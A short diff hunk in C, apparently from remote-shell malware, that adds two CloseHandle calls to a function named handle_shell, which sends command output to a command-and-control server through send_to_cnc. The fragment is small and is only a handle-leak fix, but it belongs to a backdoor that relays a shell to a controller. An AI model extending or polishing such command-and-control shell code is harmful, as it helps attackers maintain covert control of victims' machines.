@@ -84,6 +84,8 @@ void handle_shell()
             send_to_cnc(&bytes_read, sizeof(bytes_read));
             if (!bytes_read)
             {
+                CloseHandle(cmd.out.wr);
+                CloseHandle(cmd.out.rd);
                 return;
             }
             send_to_cnc(out, bytes_read);
